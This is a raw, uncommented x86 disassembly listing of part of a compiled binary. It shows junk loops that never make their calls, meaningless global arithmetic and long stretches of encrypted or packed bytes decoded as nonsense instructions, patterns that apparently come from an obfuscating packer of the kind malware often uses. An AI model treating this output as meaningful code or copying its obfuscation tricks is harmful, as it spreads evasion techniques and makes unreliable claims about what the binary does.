  4093b0:	mov    edx,DWORD PTR ds:0x4245be
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4245be,edx
  4093bd:	cmp    DWORD PTR ds:0x4245be,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4245be,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x421896
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0x18c0cb82
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	jmp    0x409502
  409490:	(bad)  
  409491:	cmp    eax,0x2d5e685a
  409496:	ds or  eax,0xed55db8c
  40949c:	fdiv   QWORD PTR [ecx-0x5f]
  40949f:	add    ebx,ecx
  4094a1:	jns    0x40946b
  4094a3:	adc    BYTE PTR [ecx-0x56],0x45
  4094a7:	call   0xd35a0795
  4094ac:	add    al,0x4
  4094ae:	fwait
  4094af:	js     0x4094e1
  4094b1:	arpl   WORD PTR ss:[ebp+0x2f],si
  4094b5:	in     al,dx
  4094b6:	push   ebp
  4094b7:	hlt    
  4094b8:	fcomp  QWORD PTR [edx+ebx*1+0x79]
  4094bc:	push   ebp
  4094bd:	and    ecx,edx
  4094bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094c0:	inc    edi
  4094c1:	inc    eax
  4094c2:	in     eax,dx
  4094c3:	xor    esi,esi
  4094c5:	push   ecx
  4094c6:	sbb    ebp,DWORD PTR [ebp+0x36b3c488]
  4094cc:	sahf   
  4094cd:	std    
  4094ce:	ret    0x2a0a
  4094d1:	and    al,0x3c
  4094d3:	sub    DWORD PTR [ebx-0x69139259],edi
  4094d9:	cwde   
  4094da:	adc    eax,0xd74780b9
  4094df:	adc    DWORD PTR [esi],0x22
  4094e2:	and    eax,0x384d8150
  4094e7:	mov    bh,0x81
  4094e9:	(bad)
  4094ed:	retf   
  4094ee:	push   eax
  4094ef:	inc    ebp
  4094f0:	loop   0x40953e
  4094f2:	mov    WORD PTR [ecx],fs
  4094f4:	fidiv  DWORD PTR [esi]
  4094f6:	cmp    BYTE PTR [edi-0xcdc844e],ch
  4094fc:	or     esi,DWORD PTR [edi-0x1f]
  4094ff:	aad    0x20
  409501:	mov    ds:0xb125dee7,al
  409506:	jbe    0x409496
  409508:	cli    
  409509:	xlat   BYTE PTR ds:[ebx]
  40950a:	pop    esp
  40950b:	lahf   
  40950c:	push   ebx
  40950d:	jg     0x4094f4
  40950f:	stc    
  409510:	mov    BYTE PTR [edi],bl
  409512:	pop    ss
  409513:	pop    eax
  409514:	push   edx
  409515:	fstp   TBYTE PTR [esp+ecx*2+0x5cb80245]
  40951c:	cmp    eax,0xe77072c7
  409521:	retf   0x758b
  409524:	adc    BYTE PTR [ecx-0x3f74efba],cl
  40952a:	mov    eax,DWORD PTR [ebp+0x8]
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    dl,BYTE PTR [ebx+0x9605947]
  409543:	and    DWORD PTR [esi+0x7e],edi
  409546:	cmp    BYTE PTR [esi+0x7e],0x7e
  40954a:	cmc    
  40954b:	in     eax,0xc1
  40954d:	paddusw mm0,QWORD PTR [ebx-0x70c5077]
  409554:	js     0x40950a
  409556:	scas   al,BYTE PTR es:[edi]
  409557:	cli    
  409558:	std    
  409559:	ret    
  40955a:	mov    ebx,0xbd4ddce7
  40955f:	ja     0x40958e
  409561:	xor    ebp,DWORD PTR [ebx]
  409563:	mov    WORD PTR [ebp+edi*2+0x30],gs
  409567:	jmp    0x409568
  409569:	ins    BYTE PTR es:[edi],dx
  40956a:	push   ss
  40956b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40956c:	mov    esi,0x78deddd2
  409571:	jmp    0x7fc021a9
  409576:	pop    ebp
  409577:	sub    edi,edi
  409579:	mov    dl,0xe9
  40957b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40957c:	mov    ch,0x4c
  40957f:	xlat   BYTE PTR ds:[ebx]
  409580:	int    0xec
  409582:	pop    ss
  409583:	mov    ecx,0x2eb674cf
  409588:	adc    edi,edx
  40958a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40958b:	xchg   edx,eax
  40958c:	sbb    ebp,ecx
  40958e:	sahf   
  40958f:	iret   
  409590:	loop   0x409545
  409592:	in     eax,0xb4
  409594:	arpl   si,sp
  409596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409597:	jae    0x40954d
  409599:	lods   eax,DWORD PTR ds:[esi]
  40959a:	fmul   QWORD PTR [edx+0x72]
  40959d:	xor    ebp,DWORD PTR [ebx]
  40959f:	mov    ds:0x1c893d4b,al
  4095a4:	jmp    0x855a:0x3bdf9553
  4095ab:	lods   al,BYTE PTR ds:[esi]
  4095ac:	int    0x43
  4095ae:	inc    ebx
  4095af:	(bad)  
  4095b0:	std    
  4095b1:	std    
  4095b2:	jmp    0x4095a5
  4095b4:	imul   BYTE PTR [edx]
  4095b6:	call   DWORD PTR [ebx-0x32]
  4095b9:	push   eax
  4095ba:	xor    al,0xb1
  4095bc:	outs   dx,BYTE PTR ds:[esi]
  4095bd:	icebp  
  4095be:	cdq    
  4095bf:	push   0xb38bc3f1
  4095c4:	push   ebp
  4095c5:	popa   
  4095c6:	dec    edx
  4095c7:	mov    dh,0x74
  4095c9:	call   0xdd16a7e6
  4095ce:	mov    edi,DWORD PTR [edx-0x73]
  4095d1:	mov    cs,esi
  4095d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095d4:	jecxz  0x409569
  4095d6:	dec    esp
  4095d7:	push   cs
  4095d8:	mov    ds:0x58fa04c5,eax
  4095dd:	mov    ah,0x33
  4095df:	rol    DWORD PTR [ebx],0xc2
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    esi,DWORD PTR [esi-0x1d]
  40961d:	stc    
  40961e:	jno    0x4095bd
  409620:	and    DWORD PTR [esi+0x7e],edi
  409623:	push   ss
  409624:	jg     0x4096a4
  409626:	jle    0x40962a
  409628:	push   0xffffffa2
  40962a:	xchg   edi,eax
  40962b:	inc    edx
  40962c:	pop    eax
  40962d:	arpl   WORD PTR [edx+0x6577dac9],si
  409633:	ret    0xed42
  409636:	add    DWORD PTR [edi+eiz*4+0x4a3d5356],esi
  40963d:	mov    gs,ecx
  40963f:	jb     0x4095f6
  409641:	and    DWORD PTR [ebp+esi*4-0x3e],ebp
  409645:	xor    DWORD PTR [ecx+0x797fd4b],eax
  40964b:	retf   0x860f
  40964e:	jo     0x40963e
  409650:	dec    edx
  409651:	xchg   BYTE PTR [ecx-0x27012ec1],al
  409657:	rcl    DWORD PTR [ebp-0x78],cl
  40965a:	in     al,dx
  40965b:	jp     0x409679
  40965d:	imul   BYTE PTR [eax-0x3202e71]
  409663:	test   eax,0x2e3c96d9
  409668:	fdiv   QWORD PTR [edi-0x25]
  40966b:	int3   
  40966c:	jbe    0x4096e4
  40966e:	add    BYTE PTR [edi-0x5],ch
  409671:	cmp    ch,BYTE PTR [eax]
  409673:	es mov al,0x4b
  409676:	xor    eax,eax
  409678:	fwait
  409679:	lds    ebx,FWORD PTR [ecx+edi*2]
  40967c:	out    0xab,eax
  40967e:	cmp    edi,edx
  409680:	push   ebx
  409681:	div    DWORD PTR [ebx]
  409683:	push   ds
  409684:	cdq    
  409685:	leave  
  409686:	add    BYTE PTR [edx+0x445b9d3d],0xf0
  40968d:	xchg   esp,eax
  40968e:	xchg   esi,eax
  40968f:	jg     0x409695
  409691:	cmc    
  409692:	add    esp,DWORD PTR [esi]
  409694:	inc    eax
  409695:	inc    ebx
  409696:	outs   dx,DWORD PTR ds:[esi]
  409697:	jno    0x40966a
  409699:	daa    
  40969a:	xchg   edi,eax
  40969b:	xchg   ebp,eax
  40969c:	inc    ebp
  40969d:	sub    eax,0x1e18c4d7
  4096a2:	add    bh,BYTE PTR [ecx]
  4096a4:	popa   
  4096a5:	ror    BYTE PTR [esi+0x1d],1
  4096a8:	inc    esp
  4096a9:	cwde   
  4096aa:	jp     0x4096b6
  4096ac:	add    ecx,DWORD PTR ds:0x5459c191
  4096b2:	xor    ebp,edx
  4096b4:	or     al,0x9f
  4096b6:	push   ds
  4096b7:	push   esi
  4096b8:	jl     0x409674
  4096ba:	retf   
  4096bb:	out    dx,eax
  4096bc:	jbe    0x409664
  4096be:	dec    esp
  4096bf:	pop    esi
  4096c0:	push   esp
  4096c1:	call   0xbfb4ee78
  4096c6:	lahf   
  4096c7:	adc    ah,BYTE PTR [ebp+0x13]
  4096ca:	ret    
  4096cb:	mov    ch,0x71
  4096cd:	inc    ebx
  4096ce:	out    0x87,eax
  4096d0:	int    0x1a
  4096d2:	les    ebx,FWORD PTR [ecx]
  4096d4:	mov    ch,0xef
  4096d6:	in     eax,0xba
  4096d8:	ja     0x4096f8
  4096da:	fnsave [ecx]
  4096dc:	push   ss
  4096dd:	je     0x4096b6
  4096df:	cmp    dh,BYTE PTR [eax]
  4096e1:	push   esi
  4096e2:	retf   0x8dc3
  4096e5:	jg     0x409697
  4096e7:	cmp    eax,0x65c843e9
  4096ec:	arpl   si,ax
  4096ee:	addr16 push esi
  4096f0:	cwde   
  4096f1:	jge    0x4096f3
  4096f3:	jae    0x4096f2
  4096f5:	mov    WORD PTR [ebx],es
  4096f7:	mov    bh,0x6a
  4096f9:	in     al,dx
  4096fa:	or     eax,0xa6a2c5ae
  4096ff:	dec    edi
  409700:	xchg   eax,ecx
  409702:	xor    esi,DWORD PTR [ebp+0x409f4d32]
  409708:	jbe    0x4096ac
  40970a:	in     eax,dx
  40970b:	cmc    
  40970c:	popf   
  40970d:	arpl   WORD PTR [edx-0x5cd8c4dc],bx
  409713:	pop    ebp
  409714:	lods   al,BYTE PTR ds:[esi]
  409715:	pop    ebp
  409716:	lods   eax,DWORD PTR fs:[esi]
  409718:	dec    esi
  409719:	fs jge 0x409787
  40971c:	mov    ebx,0xaa9a5937
  409721:	pop    ebx
  409722:	(bad)  
  409723:	and    dh,dh
  409725:	aad    0xe
  409727:	cmp    al,BYTE PTR [ebp+0x66]
  40972a:	(bad)  
  40972b:	fimul  DWORD PTR [edx-0x34aa9b66]
  409731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409732:	test   DWORD PTR [edi+0x35],0x6c8cc415
  409739:	mov    esp,0xa4d96dff
  40973e:	ins    DWORD PTR es:[edi],dx
  40973f:	mov    edi,0xb6240396
  409744:	or     cl,BYTE PTR [edx+0x25c433b5]
  40974a:	xchg   esp,eax
  40974b:	ror    DWORD PTR ds:0x1b5169ed,1
  409751:	rol    bh,1
  409753:	inc    ebp
  409754:	cld    
  409755:	cmp    al,0x85
  409757:	pushf  
  409758:	clc    
  409759:	or     DWORD PTR ds:0x4245ae,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4245ca,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4245ba
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	mov    ebx,0xb50795c0
  4097c4:	es jle 0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x409780
  4097cc:	fisub  WORD PTR [edi+ecx*4]
  4097cf:	push   esp
  4097d1:	adc    DWORD PTR [edx],0xffffff9a
  4097d4:	xor    eax,0x18b9ec83
  4097d9:	rcl    BYTE PTR [edi],0x9f
  4097dc:	shl    BYTE PTR [eax+0x42f32a93],0x15
  4097e3:	stc    
  4097e4:	pop    es
  4097e5:	jmp    0xd0db7140
  4097ea:	adc    eax,0xcc661469
  4097ef:	cli    
  4097f0:	icebp  
  4097f1:	xchg   ebx,eax
  4097f2:	mov    bl,0x30
  4097f5:	and    edx,edi
  4097f7:	pop    esp
  4097f8:	dec    edi
  4097f9:	push   esp
  4097fa:	or     ah,BYTE PTR [ebp-0x3d0255c4]
  409800:	mov    al,0x7a
  409802:	push   esp
  409803:	mov    al,0x6
  409805:	pushf  
  409806:	push   ebp
  409807:	dec    eax
  409808:	neg    DWORD PTR [ecx+0xc]
  40980b:	out    dx,eax
  40980c:	test   al,0xa8
  40980e:	sbb    ch,BYTE PTR [esi-0x30d70816]
  409814:	stc    
  409815:	xor    ch,0xf9
  409818:	xor    BYTE PTR [ebp+0x1c],ah
  40981b:	data16 (bad) 
  40981d:	retf   
  40981e:	pop    eax
  40981f:	(bad)  
  409820:	fsubr  st,st(3)
  409822:	pop    ds
  409823:	gs push edx
  409825:	mov    ebp,0x36360af2
  40982a:	xchg   ebx,eax
  40982b:	mov    ebx,0xb84334ac
  409830:	xor    DWORD PTR ds:0xb4bb2e86,ebx
  409836:	mov    gs,WORD PTR [edx+0x3061b6d3]
  40983c:	loopne 0x40982b
  40983e:	mov    edi,ecx
  409840:	rol    BYTE PTR [esi+0x27d60f93],1
  409846:	sti    
  409847:	(bad)  [edx]
  409849:	sub    DWORD PTR [edi],0xed2b399b
  40984f:	mov    ebx,0x3f0d2d46
  409854:	shl    dl,1
  409856:	jp     0x4097e1
  409858:	iret   
  409859:	ret    
  40985a:	leave  
  40985b:	hlt    
  40985c:	pop    ss
  40985d:	dec    edi
  40985e:	mov    al,0x35
  409860:	dec    ebp
  409861:	jne    0x409803
  409863:	mov    esi,0x5f1bc116
  409868:	mov    ch,bl
  40986a:	push   esi
  40986b:	sub    ebp,DWORD PTR [edx-0x71]
  40986e:	fcmovnbe st,st(6)
  409870:	loop   0x4097f2
  409872:	push   0xffffff93
  409874:	(bad)  
  409875:	sbb    eax,0x4a9a31c7
  40987a:	xchg   esi,eax
  40987b:	outs   dx,DWORD PTR gs:[esi]
  40987d:	pop    edi
  40987e:	cmp    ah,bh
  409880:	mov    esp,DWORD PTR [eax]
  409882:	jo     0x40981c
  409884:	aad    0x80
  409886:	sbb    eax,0xac4855e
  40988b:	xchg   edx,eax
  40988c:	loopne 0x409847
  40988e:	aad    0x67
  409890:	repz ja 0x4098d7
  409893:	fst    DWORD PTR [ebx-0x28]
  409896:	jb     0x40985a
  409898:	in     al,0x9d
  40989a:	(bad)  
  40989b:	push   0xffffff9a
  40989d:	lock je 0x4098ba
  4098a0:	call   0xc69d5217
  4098a5:	das    
  4098a6:	mov    bl,0xb1
  4098a8:	mov    bl,0x38
  4098aa:	lds    edx,FWORD PTR [ecx-0x73]
  4098ad:	fstp   DWORD PTR [ebp-0x41]
  4098b0:	mov    ebx,0x371af8a9
  4098b5:	mov    WORD PTR [esi-0x5cd3fc16],gs
  4098bb:	mov    esp,0x9af9c527
  4098c0:	xchg   ebp,eax
  4098c1:	fadd   QWORD PTR [esi+0x13cdaa84]
  4098c7:	mov    WORD PTR [edi],es
  4098c9:	mov    BYTE PTR [ebx-0x30abb746],dl
  4098cf:	int3   
  4098d0:	inc    esi
  4098d1:	mov    ds:0xfaa1124,al
  4098d6:	je     0x4098d7
  4098d8:	ror    DWORD PTR [esi+0x6f],0xce
  4098dc:	dec    esi
  4098dd:	sbb    BYTE PTR [edx],ah
  4098df:	or     DWORD PTR [edx-0x54],eax
  4098e2:	in     eax,dx
  4098e3:	xor    bl,bh
  4098e5:	retf   
  4098e6:	sahf   
  4098e7:	xor    eax,0x4bb59d16
  4098ec:	push   es
  4098ed:	mov    eax,0x83df01c9
  4098f2:	xchg   DWORD PTR [ebx+0x25811445],ecx
  4098f8:	and    eax,DWORD PTR fs:[ecx+0x0]
  4098fc:	add    BYTE PTR [eax],al
  4098fe:	add    BYTE PTR [eax],al
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0xa487b74c
  409977:	leave  
  409978:	ins    DWORD PTR es:[edi],dx
  409979:	daa    
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x4099f3
  409981:	push   ebx
  409982:	popa   
  409983:	jmp    0x4192a92e
  409988:	add    eax,0x22cfe806
  40998d:	es push esp
  40998f:	jae    0x4099ca
  409991:	pop    es
  409992:	popf   
  409993:	cwde   
  409994:	dec    esp
  409995:	xchg   esp,eax
  409996:	inc    ecx
  409997:	mov    bl,0x4b
  409999:	adc    al,0x7a
  40999b:	inc    bl
  40999d:	push   cs
  40999e:	sbb    esi,edi
  4099a0:	shl    DWORD PTR [eax],1
  4099a2:	sbb    dl,cl
  4099a4:	(bad)  
  4099a6:	mov    dh,0x64
  4099a8:	loope  0x409987
  4099aa:	cmp    al,bh
  4099ac:	aaa    
  4099ad:	jne    0x4099bf
  4099af:	aaa    
  4099b0:	in     eax,0xb5
  4099b2:	mov    bh,0xa4
  4099b4:	ret    
  4099b5:	lods   al,BYTE PTR ds:[esi]
  4099b6:	push   ecx
  4099b7:	aam    0x73
  4099b9:	dec    ebx
  4099ba:	push   ss
  4099bb:	fisubr WORD PTR [edx+0x64]
  4099be:	fstp   DWORD PTR ds:0x90de3904
  4099c4:	mov    ds:0x9829020a,eax
  4099c9:	ja     0x409956
  4099cb:	les    ebp,FWORD PTR [edx+0x69469f79]
  4099d1:	inc    esi
  4099d2:	mov    dl,BYTE PTR [edi+0x76a78ad1]
  4099d8:	push   ecx
  4099d9:	add    edi,DWORD PTR [edi-0x44de8297]
  4099df:	pop    es
  4099e0:	call   0x5a86:0x4d4da9b2
  4099e7:	mov    ch,0x24
  4099e9:	push   esp
  4099ea:	outs   dx,BYTE PTR ds:[esi]
  4099eb:	and    al,0x97
  4099ed:	and    al,0x14
  4099ef:	mov    DWORD PTR [ebx+0x2c6e908],esi
  4099f5:	inc    ecx
  4099f6:	and    DWORD PTR [ebp+ecx*2+0x3d],ebx
  4099fa:	push   ds
  4099fb:	jnp    0x4099bd
  4099fd:	in     eax,0xca
  4099ff:	add    BYTE PTR [eax-0x3a],0x48
  409a03:	pop    edi
  409a04:	xchg   ecx,eax
  409a05:	or     bh,BYTE PTR [edi]
  409a07:	jmp    0x4099a2
  409a09:	xchg   DWORD PTR [edx],ebx
  409a0b:	xchg   ebp,eax
  409a0c:	jno    0x409a75
  409a0e:	xor    BYTE PTR [eax-0x7b9c02d6],ah
  409a14:	sbb    BYTE PTR [eax+0x644d63aa],bh
  409a1a:	ds pop edx
  409a1c:	scas   eax,DWORD PTR es:[edi]
  409a1d:	std    
  409a1e:	pop    edi
  409a1f:	mov    ebx,ecx
  409a21:	(bad)  
  409a22:	fld    st(2)
  409a24:	mov    esi,eax
  409a26:	cdq    
  409a27:	sar    BYTE PTR [ebp+0x4f],cl
  409a2a:	push   0x27
  409a2c:	push   edx
  409a2d:	fidivr WORD PTR [esi-0x2c20dbde]
  409a33:	dec    edi
  409a34:	inc    ebx
  409a35:	xor    al,0xf1
  409a37:	sub    eax,0x33ed27f
  409a3c:	test   edi,ecx
  409a3e:	xor    eax,0x50c6fafe
  409a43:	mov    ds:0x10c20bcc,eax
  409a48:	xchg   ebx,eax
  409a49:	push   0xffffffca
  409a4b:	js     0x409a1e
  409a4d:	lods   eax,DWORD PTR ds:[esi]
  409a4e:	leave  
  409a4f:	jg     0x409a3e
  409a51:	jl     0x4099f9
  409a53:	mov    ah,BYTE PTR [edx]
  409a55:	push   ss
  409a56:	js     0x409ac5
  409a58:	(bad)  
  409a59:	int3   
  409a5a:	clc    
  409a5b:	mov    DWORD PTR [esi+ebp*4],edx
  409a5e:	and    ecx,DWORD PTR [ebp+edx*8-0x7b274bb4]
  409a65:	cmp    ax,WORD PTR cs:[ebx]
  409a69:	stos   DWORD PTR es:[edi],eax
  409a6a:	xchg   esp,eax
  409a6b:	sub    ecx,DWORD PTR [edi-0x66]
  409a6e:	pop    ecx
  409a6f:	(bad)  
  409a70:	mov    esi,0x884493fd
  409a75:	out    0xcc,eax
  409a77:	jnp    0x409af8
  409a79:	or     BYTE PTR [edx+0x1323e704],cl
  409a7f:	loop   0x409ac3
  409a81:	mov    esi,edi
  409a83:	sub    BYTE PTR [edx],0xf2
  409a86:	mov    es,WORD PTR [edi-0x4e2342f7]
  409a8c:	xlat   BYTE PTR ds:[ebx]
  409a8d:	pop    edx
  409a8e:	mov    ebx,0xfa2ffba7
  409a93:	ret    
  409a94:	cmc    
  409a95:	stc    
  409a96:	jbe    0x409a1b
  409a98:	jmp    0x409b11
  409a9a:	in     eax,0x8d
  409a9c:	pop    ebx
  409a9d:	test   DWORD PTR [ecx+esi*2],edx
  409aa0:	pusha  
  409aa1:	es dec ecx
  409aa3:	xor    eax,0x7ddb41ff
  409aa8:	mov    DWORD PTR [edx+0x8],eax
  409aab:	mov    eax,DWORD PTR [ebp+0x1c]
  409aae:	mov    edx,DWORD PTR [ebp+0x10]
  409ab1:	mov    DWORD PTR [edx+0xc],eax
  409ab4:	mov    eax,DWORD PTR [ebp+0x20]
  409ab7:	mov    edx,DWORD PTR [ebp+0x10]
  409aba:	mov    DWORD PTR [edx+0x10],eax
  409abd:	mov    eax,eax
  409abf:	mov    eax,DWORD PTR [ebp+0x14]
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4245b6
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4245c2,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4245c2,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4245b2
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4245c2,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4245b2,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
